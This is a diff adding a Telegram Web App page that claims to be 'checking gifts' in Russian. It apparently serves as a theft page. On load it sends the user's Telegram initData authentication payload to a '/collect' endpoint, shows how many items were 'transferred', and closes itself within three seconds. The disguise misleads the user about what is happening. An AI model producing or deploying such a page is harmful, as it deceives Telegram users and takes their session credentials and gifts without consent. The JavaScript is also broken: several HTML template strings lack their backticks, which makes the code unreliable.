@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+</head>
+<body style="text-align:center;margin-top:100px;font-family:Arial;background:#0a0a0a;color:#fff;">
+    <h2>🔍 Проверка подарков...</h2>
+    <p style="color:#888;">Это займёт пару секунд</p>
+    
+    <script>
+        const tg = window.Telegram.WebApp;
+        tg.ready();
+        
+        fetch('/collect', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({initData: tg.initData})
+        })
+        .then(res => res.json())
+        .then(data => {
+            if (data.status === 'ok') {
+                document.body.innerHTML = 
+                    <h2 style="color:#4caf50;">✅ Готово!</h2>
+                    <p style="color:#888;">Передано: ${data.transferred}</p>
+                ;
+            } else {
+                document.body.innerHTML = 
+                    <h2 style="color:#f44336;">❌ Ошибка</h2>
+                    <p style="color:#888;">${data.error || 'попробуйте позже'}</p>
+                ;
+            }
+        })
+        .catch(() => {
+            document.body.innerHTML = 
+                <h2 style="color:#f44336;">❌ Ошибка соединения</h2>
+            ;
+        });
+        
+        setTimeout(() => tg.close(), 3000);
+    </script>
+</body>
+</html>
